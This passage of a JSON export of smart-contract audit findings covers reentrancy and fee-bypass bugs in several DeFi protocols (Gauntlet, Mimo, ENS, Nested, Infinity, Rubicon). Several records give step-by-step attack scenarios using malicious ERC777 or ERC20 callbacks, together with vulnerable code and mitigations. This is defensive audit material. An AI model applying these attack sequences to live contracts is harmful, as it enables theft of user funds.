          "tags_tag": {
            "title": "External Call"
          }
        },
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "7091",
      "kind": "PDF",
      "auditfirm_id": "6",
      "impact": "HIGH",
      "finders_count": 3,
      "protocol_id": "133",
      "title": "Malicious manager could cause Vault funds to be inaccessible",
      "content": "## Severity: High Risk\n\n## Context\nAeraVaultV1.sol#L794-L822\n\n## Description\nThe `calculateAndDistributeManagerFees()` function pushes tokens to the manager, and if for unknown reasons this action fails, the entire Vault would be blocked, and funds become inaccessible. This occurs because the following functions depend on the execution of `calculateAndDistributeManagerFees()`: \n\n- `deposit()`\n- `withdraw()`\n- `setManager()`\n- `claimManagerFees()`\n- `initiateFinalization()`\n- `finalize()`\n\nWithin `calculateAndDistributeManagerFees()`, the function `safeTransfer()` is the riskiest and could fail under the following situations:\n\n- A token with a callback is used, for example, an ERC777 token, and the callback is not implemented correctly.\n- A token with a blacklist option is used and the manager is blacklisted. For example, USDC has such blacklist functionality. Because the manager can be an unknown party, a small risk exists that he is malicious and his address could be blacklisted in USDC.\n\n**Note:** Set as high risk because although probability is very small, impact results in Vault funds becoming inaccessible.\n\n```solidity\nfunction calculateAndDistributeManagerFees() internal {\n    ...\n    for (uint256 i = 0; i < amounts.length; i++) {\n        tokens[i].safeTransfer(manager, amounts[i]);\n    }\n}\n```\n\n## Recommendation\nBeware of including tokens with callbacks such as ERC777 tokens into the Vault. Additionally, use a pull over push pattern to let the manager retrieve fees. This way, the Vault can never get blocked. This recommendation can be implemented as follows:\n\n- Rename `calculateAndDistributeManagerFees()` to `calculateManagerFees()`.\n- In `calculateManagerFees()`, add up all management fees (for each manager address separately, e.g., in a mapping), to prevent having to push the fees in `setManager()` and keep track of the total of the fees (`managersFeeTotal`) to make sure fees are not withdrawn.\n- In `withdraw()` and `returnFunds()`, make sure unclaimed fees cannot be withdrawn.\n- Let the manager retrieve fees via `claimManagerFees()`, using `msg.sender` as the index to the mapping with the fees. This function should retrieve Balancer funds, e.g., use the code of the second half of `calculateAndDistributeManagerFees()`. It should also lower `managersFeeTotal` and the fee for `msg.sender`.\n\nThis also alleviates rounding issues with fees and reduces gas used by `deposit()`, which could be relevant when pools are deployed with a large number of tokens.\n\nAn alternative could be to use `try/catch` around the call to `safeTransfer()`, but this way the fees aren’t distributed properly.\n\n## Gauntlet\nWe will be incorporating the suggestions.",
      "summary": "\nThis bug report is about the function calculateAndDistributeManagerFees() in the AeraVaultV1.sol smart contract. This function pushes tokens to the manager and if for any reason this action fails, the entire Vault would be blocked and funds become inaccessible. This is because several other functions depend on the execution of calculateAndDistributeManagerFees(). The riskiest action within this function is the call to safeTransfer(), which could fail if the token used has a callback that is not implemented correctly, or if the manager is blacklisted.\n\nThe recommendation is to use a pull over push pattern to let the manager retrieve fees. This way the Vault can never get blocked. This can be implemented by renaming calculateAndDistributeManagerFees() to calculateManagerFees(), adding up the management fees in a mapping, making sure unclaimed fees cannot be withdrawn, and letting the manager retrieve fees via claimManagerFees(). An alternative could be to use try/catch around the call to safeTransfer(), but this way the fees aren’t distributed properly. Gauntlet will be incorporating the suggestions.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 4,
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/Gauntlet-Spearbit-Security-Review.pdf",
      "pdf_page_from": 12,
      "contest_id": "",
      "slug": "malicious-manager-could-cause-vault-funds-to-be-inaccessible-spearbit-gauntlet-pdf",
      "firm_name": "Spearbit",
      "firm_logo_square": "spearbit_square.png",
      "protocol_name": "Gauntlet",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Spearbit",
        "logo_square": "spearbit_square.png"
      },
      "protocols_protocol": {
        "name": "Gauntlet",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Insurance"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Staking Pool"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        },
        {
          "tags_tag": {
            "title": "Admin"
          }
        }
      ]
    },
    {
      "id": "3143",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 2,
      "protocol_id": "234",
      "title": "[M-01] Vault rebalancing can be exploited if two vaults rebalance into the same vault",
      "content": "_Submitted by 0x52, also found by ayeslick_\n\nUser funds stolen.\n\n### Proof of Concept\n\nSwap data is completely arbitrary and can be used to swap though malicious ERC20 tokens allowing control transfer. This control transfer would allow the attacker to call rebalance on a second vault and exploit both as long as both vaults rebalance into the same vault.\n\nAssumptions:<br>\nVault A and C both rebalance into vault B (i.e. value is transferred from vault A and C to vault B)<br>\nVault A and C are both eligible for rebalances<br>\n\nVault A -<br>\nValue: $100<br>\nFlashloan value: 50<br>\n\nVault B -<br>\nValue: $100<br>\n\nVault C -<br>\nValue: $100<br>\nFlashloan value: 50<br>\n\n1.  User calls rebalance on vault A to trigger it rebalancing to vault B, storing vault B's value as $100\n\n2.  During the swap control is transferred due to use of malicious ERC20 specified in swap data\n\n3.  Malicious token calls rebalance on vault C to trigger a rebalancing to vault B, storing vault B's value as $100 because Vault B's value hasn't been modified yet.\n\n4.  Swap data in vault C rebalance swaps flashloan C to $50 worth of asset B\n\n5.  Vault C rebalance deposits swap funds into vault B\n\n6.  Vault C rebalance withdraws from vault C to pay back flashloan C\n\n7.  Vault C rebalance validates that the value of B = $150 ( 100 + 50 ) and finishes, resuming Vault A rebalance\n\n8.  Vault A rebalance finishes its swap, siphoning off the swapped funds to attacker through the malicious pool\n\n9.  Vault A rebalance doesn't deposit any funds but the value of vault B has already been increased by rebalance C\n\n10. Vault A rebalance withdraws from vault A to pay back vault flashloan A\n\n11. Vault A rebalance validates that the value of B = $150 ( 100 + 50 )\n\nThe attacker has now stolen funds, up to half the value of the total rebalance amount.\n\n### Recommended Mitigation Steps\n\nAdd nonReentrant modifier to MIMOAutomatedRebalnce.sol#rebalance.\n\n**[RayXpub (Mimo) disagreed with severity and commented](https://github.com/code-423n4/2022-08-mimo-findings/issues/39#issuecomment-1210505384):**\n > The attack described seems to be missing some elements mainly on item 9. Rebalance can't choose to just not deposit as it calls `depositAndBorrow()` with a `mintAmount` computed onchain through the `_getAmounts()` function so it will have to mint some amount. This might be possible if the additional minting requirement by the second rebalance repayment can happen within the limits of vault B MCR. This seems to be an edge case and a complex attack, as it would require 2 vaults under trigger ratio, a malicious pool with enough liquidity and a user set mcr buffer high enough to not require additional deposit on second rebalance.\n> \n> Given the complexity and the low probability of this attack we think it should be downgraded to medium risk. We do plan on applying the recommendation of adding nonReentrant modifier.\n\n**[gzeoneth (judge) decreased severity to Medium](https://github.com/code-423n4/2022-08-mimo-findings/issues/39)** \n\n**horsefacts (warden) reviewed mitigation:**\n> **Status:** ✅ Resolved\n\n> **Finding:** Wardens identified that `MIMOAutoRebalance#rebalance` was vulnerable to reentrancy by swapping through a malicious token that transfers control to the caller.\n\n> **What changed:** The Mimo team added a [reentrancy guard](https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/contracts/actions/automated/MIMOAutoRebalance.sol#L59) to the `rebalance` function. An [integration test](https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/test/02_integration/automated/MIMOAutoActionSecurity.test.ts#L137) demonstrates that the function is protected against reentrancy.\n\n> **Why it works:** Since `rebalance` is protected by a reentrancy guard, attempts to reenter `rebalance` will now revert.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the MIMOAutomatedRebalnce.sol contract that could allow an attacker to steal user funds. The vulnerability is caused by the lack of a nonReentrant modifier, which would prevent the contract from being reentered in the middle of an operation. \n\nThe proof of concept outlines a scenario where an attacker calls rebalance on two vaults, Vault A and Vault C. Both vaults rebalance into Vault B, and the attacker uses malicious ERC20 tokens to control the transfer of funds. The malicious token calls rebalance on Vault C, which deposits swap funds into Vault B, and then withdraws from Vault C to pay back the flashloan. The attacker has now stolen funds, up to half the value of the total rebalance amount.\n\nThe recommended mitigation step for this vulnerability is to add a nonReentrant modifier to the MIMOAutomatedRebalnce.sol#rebalance. This will prevent the contract from being reentered in the middle of an operation, thus preventing the attack.",
      "report_date": {},
      "contest_prize_txt": "$50,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-08-mimo-august-2022-contest",
      "sponsor_name": "Mimo DeFi",
      "sponsor_link": "https://twitter.com/mimo_labs",
      "quality_score": 4,
      "general_score": 4,
      "source_link": "https://code4rena.com/reports/2022-08-mimo",
      "github_link": "https://github.com/code-423n4/2022-08-mimo-findings/issues/39",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "150",
      "slug": "m-01-vault-rebalancing-can-be-exploited-if-two-vaults-rebalance-into-the-same-vault-code4rena-mimo-defi-mimo-august-2022-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Mimo DeFi",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Mimo DeFi",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Bridge"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Vault"
          }
        },
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "5542",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 6,
      "protocol_id": "897",
      "title": "[H-01] It is possible to create fake ERC1155 `NameWrapper` token for subdomain, which is not owned by `NameWrapper`",
      "content": "\n[NameWrapper.sol#L820-L821](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L820-L821)<br>\n[NameWrapper.sol#L524](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L524)<br>\n[NameWrapper.sol#L572](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L572)<br>\n\nDue to re-entrancy possibility in `NameWrapper._transferAndBurnFuses` (called from `setSubnodeOwner` and `setSubnodeRecord`), it is possible to do some stuff in `onERC1155Received` right after transfer but before new owner and new fuses are set. This makes it possible, for example, to unwrap the subdomain, but owner and fuses will still be set even for unwrapped domain, creating fake `ERC1155` `NameWrapper` token for domain, which is not owned by `NameWrapper`.\n\nFake token creation scenario:\n\n1.  `Account1` registers and wraps `test.eth` domain\n2.  `Account1` calls `NameWrapper.setSubnodeOwner` for `sub.test.eth` subdomain with `Account1` as owner (to make NameWrapper owner of subdomain)\n3.  `Contract1` smart contract is created, which calls unwrap in its `onERC1155Received` function, and a function to send `sub.test.eth` ERC1155 NameWrapper token back to `Account1`\n4.  `Account1` calls `NameWrapper.setSubnodeOwner` for `sub.test.eth` with `Contract1` as new owner, which unwraps domain back to `Account1` but due to re-entrancy, NameWrapper sets fuses and ownership to `Contract1`\n5.  `Account1` calls function to send ERC1155 token from `Contract1` back to self.\n\nAfter this sequence of events, `sub.test.eth` subdomain is owned by `Account1` both in `ENS` registry and in `NameWrapper` (with fuses and expiry correctly set to the future date). Lots (but not all) of functions in `NameWrapper` will fail to execute for this subdomain, because they expect `NameWrapper` to have ownership of the domain in `ENS`, but some functions will still work, making it possible to make the impression of good domain.\n\nAt this point, ownership in `NameWrapper` is \"detached\" from ownership in `ENS` and `Account1` can do all kinds of malcious stuff with its ERC1155 token. For example:\n\n1.  Sell subdomain to the other user, transfering `ERC1155` to that user and burning `PARENT_CANNOT_CONTROL` to create impression that he can't control the domain. After receiving the payment, `Account1` can wrap the domain again, which burns existing ownership record and replaces with the new one with clear fuses and `Account1` ownership, effectively stealing domain back from unsuspecting user, who thought that `ERC1155` gives him the right to the domain (and didn't expect that parent can clear fuses when `PARENT_CANNOT_CONTROL` is set).\n\n2.  Transfer subdomain to some other smart contract, which implements `onERC1155Received`, then take it back, fooling smart contract into believing that it has received the domain.\n\n### Proof of Concept\n\nCopy these to test/wrapper and run:<br>\nyarn test test/wrapper/NameWrapperReentrancy.js\n\n<https://gist.github.com/panprog/3cd94e3fbb0c52410a4c6609e55b863e>\n\n### Recommended Mitigation Steps\n\nConsider adding `nonReentrant` modifiers with `ReentrancyGuard` implementation from `openzeppelin`. Alternatively just fix this individual re-entrancy issue. There are multiple ways to fix it depending on expected behaviour, for example saving `ERC1155` data and requiring it to match the data after transfer (restricting `onERC1155Received` to not change any data for the token received):\n\n    function _transferAndBurnFuses(\n        bytes32 node,\n        address newOwner,\n        uint32 fuses,\n        uint64 expiry\n    ) internal {\n        (address owner, uint32 saveFuses, uint64 saveExpiry) = getData(uint256(node));\n        _transfer(owner, newOwner, uint256(node), 1, \"\");\n        uint32 curFuses;\n        uint64 curExpiry;\n        (owner, curFuses, curExpiry) = getData(uint256(node));\n        require(owner == newOwner && saveFuses == curFuses && saveExpiry == curExpiry);\n        _setFuses(node, newOwner, fuses, expiry);\n    }\n\n**[Arachnid (ENS) confirmed](https://github.com/code-423n4/2022-07-ens-findings/issues/84)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the NameWrapper contract of the 2022-07-ENS project. The vulnerability is related to the possibility of re-entrancy in the _transferAndBurnFuses function, which is called from setSubnodeOwner and setSubnodeRecord. This makes it possible to do some stuff in onERC1155Received right after the transfer but before the new owner and new fuses are set. This could lead to the creation of a fake ERC1155 NameWrapper token for a domain which is not owned by NameWrapper.\n\nFor example, an attacker could register and wrap a domain, call setSubnodeOwner to make NameWrapper the owner of the subdomain, create a contract with a function to send the subdomain ERC1155 NameWrapper token back to the attacker, and then call setSubnodeOwner with the contract as the new owner. After this sequence of events, the subdomain will be owned by the attacker both in ENS and in NameWrapper, but some functions in NameWrapper will still work, creating the impression of a good domain.\n\nThe recommended mitigation steps are to consider adding nonReentrant modifiers with ReentrancyGuard implementation from openzeppelin, or to fix the individual re-entrancy issue. A proof of concept can be found in the test/wrapper folder of the project.",
      "report_date": {},
      "contest_prize_txt": "$75,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-07-ens-contest",
      "sponsor_name": "ENS",
      "sponsor_link": "https://twitter.com/ensdomains",
      "quality_score": 3,
      "general_score": 5,
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "https://github.com/code-423n4/2022-07-ens-findings/issues/84",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "145",
      "slug": "h-01-it-is-possible-to-create-fake-erc1155-namewrapper-token-for-subdomain-which-is-not-owned-by-namewrapper-code4rena-ens-ens-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "ENS",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "ENS",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Leveraged Farming"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        },
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        }
      ]
    },
    {
      "id": "2660",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 1,
      "protocol_id": "206",
      "title": "[M-01] User can bypass `entryFee` by sending arbitrary `calldata` to ParaSwap operator",
      "content": "_Submitted by 0xDjango_\n\n[NestedFactory.sol#L466](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L466)<br>\n[ParaswapOperator.sol#L34](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Paraswap/ParaswapOperator.sol#L34)<br>\n\nAny user is able to bypass the `entryFee` collection when using `NestedFactory.create()` by passing in arbitrary calldata when using the ParaSwap router. High level, a user can pass in calldata to swap from a miniscule amount of input token to an ERC777 with themselves as the recipient and will gain control of execution, at which time they can send a large amount of output token back to the Nested Factory.\n\nIf the user sends `1 wei` of input token, the Nested Factory will return an `entryFee` of `0` due to precision loss. The amount of output token returned to the contract via the direct transfer from the user will then be deposited in the vault.\n\n### Proof of Concept\n\n**Steps**\n\n*   User calls `NestedFactory.create()` with a single input order. This input order will define the parameters of the call to Paraswap.\n*   The single order defines the following in pseudocode:\n    1.  inputToken: Any token, but we'll use address(0) ETH\n    2.  amount: 1 wei\n    3.  Order(operator=Paraswap, token=USDC, calldata=calldata)\n\n***The calldata used in the call to paraswap would swap from ETH to any ERC777 (NOT USDC), with an attack contract address set as the `beneficiary`. Upon transferring the swapped ERC777 to the user's attack contract, the contract would immediately send e.g. 1,000,000 USDC directly back to the Nested Factory contract.***\n\n*   The Paraswap operator checks the balances of the buy and sell tokens. Note that the buy token is defined in the Order token parameter, not the calldata passed to Paraswap. Since the operator will check the balance of USDC, it looks like we've swapped 1 wei ETH for 1,000,000 USDC.\n*   The Paraswap operator returns the swap amounts back to Nested Factory.\n*   Nested Factory deposits the 1,000,000 USDC to the vault for the user without charging any `entryFee`.\n\nNOTE: I use 1 wei as an extreme example. You would have to ensure that you're swapping at least enough to receive 1 wei of the ERC777 to transfer to the attack contract.\n\n### Recommended Mitigation Steps\n\nAllowing a user to pass arbitrary call data to a router is risky because routers allow several paths for an attacker to gain control of execution. Originally, I believed this exploit to be possible simply by swapping to ETH, which would perform an external call to the `beneficiary`, but Paraswap actually only forwards 10,000 gas when performing ETH transfers. If Nested plans to include a vanilla Uniswap router operator, this would be an issue. Here is the Paraswap transfer logic:\n\n    function transferTokens(\n            address token,\n            address payable destination,\n            uint256 amount\n        )\n        internal\n        {\n            if (amount > 0) {\n                if (token == ETH_ADDRESS) {\n                    (bool result, ) = destination.call{value: amount, gas: 10000}(\"\");\n                    require(result, \"Failed to transfer Ether\");\n                }\n                else {\n                    IERC20(token).safeTransfer(destination, amount);\n                }\n            }\n\n        }\n\nTherefore, it might be worth exploring the option of allowing the user to only choose from a list of predefined function signatures when making calls to Paraswap. The final `Order` param that is passed to the operator would be built within the contract by concatenating the function, input, and output tokens. Even then, if the output token truly is an ERC777, the user would be able to intercept control and directly transfer more of the ERC777.\n\nA large-scale fix would be to charge the entry fee on the amount of output tokens after performing the swap. I'm not sure if this falls in line with Nested's plans though.\n\n**[maximebrugel (Nested) acknowledged](https://github.com/code-423n4/2022-06-nested-findings/issues/69)**\n\n**[Jack the Pug (judge) commented](https://github.com/code-423n4/2022-06-nested-findings/issues/69#issuecomment-1183919165):**\n > I find this to be a valid Medium issue. I have a few things to add:\n> \n> 1. It applies not only to the ParaSwap operator but also the other operators, ie, 0x;\n> 2. Not just the `entryFee`, the `exitFees` can also be bypassed in a similar way;\n> 3. Not necessarily using a ERC777, the attacker can also use a malicious ERC20 they deployed on their own;\n> \n> The root cause is that:\n> \n> `entryFee` and `exitFees` should be charged on the token that gets in and out the `Reserve`, not the inputToken/outputToken of the swap.\n\n\n\n***\n\n",
      "summary": "\nThis bug report concerns a vulnerability in the NestedFactory contract, which is part of a code repository on GitHub. The vulnerability allows a user to bypass the “entryFee” collection when using the NestedFactory.create() function. This is done by passing in arbitrary calldata when using the ParaSwap router. This allows the user to swap from a miniscule amount of input token to an ERC777 with themselves as the recipient. The amount of output token returned to the contract via the direct transfer from the user will then be deposited in the vault without charging any entry fee.\n\nThe recommended mitigation steps for this issue include allowing the user to only choose from a list of predefined function signatures when making calls to Paraswap. Alternatively, the entry fee could be charged on the amount of output tokens after performing the swap.",
      "report_date": {},
      "contest_prize_txt": "$35,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-06-nested-finance-contest",
      "sponsor_name": "Nested Finance",
      "sponsor_link": "https://twitter.com/NestedFinance",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2022-06-nested",
      "github_link": "https://github.com/code-423n4/2022-06-nested-findings/issues/69",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "137",
      "slug": "m-01-user-can-bypass-entryfee-by-sending-arbitrary-calldata-to-paraswap-operator-code4rena-nested-finance-nested-finance-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Nested Finance",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Nested Finance",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC777"
          }
        },
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "2777",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 2,
      "protocol_id": "208",
      "title": "[H-11] Reentrancy from `matchOneToManyOrders`",
      "content": "_Submitted by kenzo, also found by 0xDjango_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L178>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L216>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L230>\n\n### Vulnerability Details\n\n`matchOneToManyOrders` doesn't conform to Checks-Effects-Interactions pattern, and updates the maker order nonce only after the NFTs and payment have been sent.\nUsing this, a malicious user can re-enter the contract and re-fulfill the order using `takeOrders`.\n\n### Impact\n\nOrders can be executed twice. User funds would be lost.\n\n### Proof of Concept\n\n`matchOneToManyOrders` will set the order nonce as used only after the tokens are being sent:\n\n      function matchOneToManyOrders(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.MakerOrder[] calldata manyMakerOrders) external {\n        ...\n        if (makerOrder.isSellOrder) {\n          for (uint256 i = 0; i < ordersLength; ) {\n            ...\n            _matchOneMakerSellToManyMakerBuys(...); // @audit will transfer tokens in here\n            ...\n          }\n          //@audit setting nonce to be used only here\n          isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n        } else {\n          for (uint256 i = 0; i < ordersLength; ) {\n            protocolFee += _matchOneMakerBuyToManyMakerSells(...); // @audit will transfer tokens in here\n            ...\n          }\n          //@audit setting nonce to be used only here\n          isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n          ...\n      }\n\nSo we can see that tokens are being transferred before nonce is being set to executed.\n\nTherefore, POC for an attack -\nAlice wants to buy 2 unspecified WolfNFT, and she will pay via AMP, an ERC-777 token.\nMalicious user Bob will set up an offer to sell 2 WolfNFT.\nThe MATCH_EXECUTOR will match the offers.\nBob will set up a contract such that upon receiving of AMP, it will call [`takeOrders`](https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L336) with Alice's order, and 2 other WolfNFTs.\n(Note that although `takeOrders` is `nonReentrant`, `matchOneToManyOrders` is not, and so the reentrancy will succeed.)\n\nSo in `takeOrders`, the contract will match Alice's order with Bob's NFTs, and then set Alice's order's nonce to true, then `matchOneToManyOrders` execution will resume, and again will set Alice's order's nonce to true.\n\nAlice ended up buying 4 WolfNFTs although she only signed an order for 2. Tough luck, Alice.\n\n(Note: a similar attack can be constructed via ERC721's onERC721Received.)\n\n### Recommended Mitigation Steps\n\nConform to CEI and set the nonce to true before executing external calls.\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/184#issuecomment-1162891402):**\n > Fixed in: https://github.com/infinitydotxyz/exchange-contracts-v2/commit/b90e746fa7af13037e7300b58df46457a026c1ac\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/184#issuecomment-1179805097):**\n > Great catch! Agree with the assessment.\n\n\n\n***\n\n \n",
      "summary": "\nThis bug report is about a vulnerability in the 'matchOneToManyOrders' function of the 'InfinityExchange' smart contract. The issue is that the function does not conform to the Check-Effects-Interactions (CEI) pattern, and updates the maker order nonce only after the Non-Fungible Tokens (NFTs) and payment have been sent. This means that a malicious user can re-enter the contract and re-fulfill the order using 'takeOrders'. This can result in a user's funds being lost as orders can be executed twice. \n\nA proof of concept (POC) is provided which outlines a scenario where Alice wants to buy 2 unspecified WolfNFTs and pays via AMP, an ERC-777 token. Malicious user Bob sets up an offer to sell 2 WolfNFTs. The MATCH_EXECUTOR matches the offers, and Bob sets up a contract which calls 'takeOrders' with Alice's order and 2 other WolfNFTs. This is possible as 'matchOneToManyOrders' is not non-reentrant. As a result, Alice ends up buying 4 WolfNFTs instead of the 2 she signed up for.\n\nThe recommended mitigation step is to conform to CEI and set the nonce to true before executing external calls.",
      "report_date": {},
      "contest_prize_txt": "$50,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-06-infinity-nft-marketplace-contest",
      "sponsor_name": "Infinity NFT Marketplace",
      "sponsor_link": "https://twitter.com/infinitydotxyz",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/184",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "136",
      "slug": "h-11-reentrancy-from-matchonetomanyorders-code4rena-infinity-nft-marketplace-infinity-nft-marketplace-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Infinity NFT Marketplace",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Infinity NFT Marketplace",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Payments"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "NFT Marketplace"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Gaming"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "2497",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 1,
      "protocol_id": "216",
      "title": "[H-10] BathToken.sol#_deposit() attacker can mint more shares with re-entrancy from hookable tokens",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557-L568\n\n\n## Vulnerability details\n\n`BathToken.sol#_deposit()` calculates the actual transferred amount by comparing the before and after balance, however, since there is no reentrancy guard on this function, there is a risk of re-entrancy attack to mint more shares.\n\nSome token standards, such as ERC777, allow a callback to the source of the funds (the `from` address) before the balances are updated in `transferFrom()`. This callback could be used to re-enter the function and inflate the amount.\n\nhttps://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557-L568\n\n```solidity\nfunction _deposit(uint256 assets, address receiver)\n    internal\n    returns (uint256 shares)\n{\n    uint256 _pool = underlyingBalance();\n    uint256 _before = underlyingToken.balanceOf(address(this));\n\n    // **Assume caller is depositor**\n    underlyingToken.transferFrom(msg.sender, address(this), assets);\n    uint256 _after = underlyingToken.balanceOf(address(this));\n    assets = _after.sub(_before); // Additional check for deflationary tokens\n    ...\n```\n\n### PoC\n\nWith a ERC777 token by using the ERC777TokensSender `tokensToSend` hook to re-enter the `deposit()` function.\n\nGiven: \n\n-   